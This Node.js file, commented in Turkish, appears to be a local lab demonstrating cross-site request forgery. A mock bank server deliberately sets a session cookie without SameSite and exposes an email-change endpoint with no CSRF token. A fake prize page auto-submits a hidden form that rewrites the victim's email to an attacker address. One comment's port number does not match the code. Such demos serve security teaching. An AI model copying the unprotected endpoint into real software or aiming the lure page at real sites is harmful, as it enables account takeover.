const http = require("http");
const url = require("url");

// Bellek içi sahte kullanıcı veritabanı
let currentUser = {
  email: "kurban@kargaa.com",
  sessionToken: "session_valid_token_123",
};

// 1. HEDEF BANKA / HESAP SUNUCUSU (Port 4000)
http
  .createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const cookieHeader = req.headers.cookie || "";
    const isAuthenticated = cookieHeader.includes(
      "session=session_valid_token_123",
    );

    // Kurban oturum açtığında çerez basan sayfa
    if (parsedUrl.pathname === "/login") {
      // ZAFİYETLİ DURUM: SameSite bayrağı YOK! (Eski tarayıcı davranışı / None modu)
      res.writeHead(200, {
        "Content-Type": "text/html; charset=utf-8",
        "Set-Cookie": "session=session_valid_token_123; Path=/",
      });
      res.end(`
      <!DOCTYPE html>
      <html>
      <body style="font-family: sans-serif; padding: 40px; background: #0f172a; color: #f8fafc;">
        <h2>Banka / Hesap Paneli (Giriş Yapıldı)</h2>
        <p>Mevcut E-posta: <strong id="mail" style="color: #38bdf8;">${currentUser.email}</strong></p>
        <p>Tarayıcınızda <code>session</code> çerezi oluşturuldu.</p>
      </body>
      </html>
    `);
      return;
    }

    // Hassas E-posta Değiştirme Endpoint'i (Zafiyetli: Sadece çereze güveniyor, CSRF koruması yok)
    if (
      parsedUrl.pathname === "/api/user/change-email" &&
      req.method === "POST"
    ) {
      if (!isAuthenticated) {
        res.writeHead(401, { "Content-Type": "application/json" });
        res.end(
          JSON.stringify({
            error: "Yetkisiz istek! Oturum çerezi bulunamadı.",
          }),
        );
        return;
      }

      let body = "";
      req.on("data", (chunk) => {
        body += chunk;
      });
      req.on("end", () => {
        const params = new URLSearchParams(body);
        const newEmail = params.get("email");
        if (newEmail) {
          currentUser.email = newEmail;
          console.log(
            `[!] KRİTİK: E-posta başarıyla değiştirildi -> ${newEmail}`,
          );
        }

        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(
          JSON.stringify({
            status: "success",
            updatedEmail: currentUser.email,
          }),
        );
      });
      return;
    }

    // Profil durumunu kontrol eden JSON API
    if (parsedUrl.pathname === "/api/user/profile") {
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(
        JSON.stringify({
          email: currentUser.email,
          authenticated: isAuthenticated,
        }),
      );
      return;
    }

    res.writeHead(404);
    res.end("Not Found");
  })
  .listen(4000, () =>
    console.log(
      "[+] Hedef Banka Sunucusu (Port 4000) çalışıyor: http://localhost:4000/login",
    ),
  );

// 2. SALDIRGAN WEB SİTESİ (Port 5000)
http
  .createServer((req, res) => {
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    // Saldırganın hazırladığı tuzak: Sayfa açıldığı an otomatik submit olan gizli form
    res.end(`
    <!DOCTYPE html>
    <html>
    <head><title>Tebrikler Ödül Kazandınız!</title></head>
    <body style="font-family: sans-serif; padding: 40px; background: #1e1e2e; color: #fff;">
      <h2>🎉 iPhone 16 Kazandınız! Yükleniyor...</h2>

      <!-- Gizli CSRF Formu: Hedef bankanın endpointine POST atar -->
      <form id="csrfForm" action="http://localhost:4000/api/user/change-email" method="POST" style="display: none;">
        <input type="hidden" name="email" value="hacker@saldirgan.com" />
      </form>

      <script>
        // Kullanıcı sayfaya girdiği an formu otomatik gönder
        console.log("[Attacker] Form otomatik post ediliyor...");
        document.getElementById('csrfForm').submit();
      </script>
    </body>
    </html>
  `);
  })
  .listen(3000, () =>
    console.log(
      "[+] Saldırgan Sunucusu (Port 3000) çalışıyor: http://localhost:3000",
    ),
  );
